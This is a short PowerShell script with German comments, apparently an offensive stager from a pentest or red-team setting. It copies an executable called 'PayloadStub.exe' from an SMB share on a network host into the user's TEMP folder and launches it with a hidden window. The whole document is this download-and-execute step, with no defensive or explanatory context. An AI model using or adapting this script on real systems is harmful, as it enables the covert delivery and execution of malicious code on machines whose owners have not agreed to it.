# PowerShell: SMB-Payload in TEMP kopieren und lokal ausführen
$src = "\\192.168.178.100\share\PayloadStub.exe"
$dst = "$env:TEMP\PayloadStub.exe"

Write-Host "[*] Kopiere Payload von SMB-Share nach TEMP..." -ForegroundColor Cyan
Copy-Item $src $dst -Force

Write-Host "[*] Starte Payload lokal von $dst ..." -ForegroundColor Green
Start-Process $dst -WindowStyle Hidden
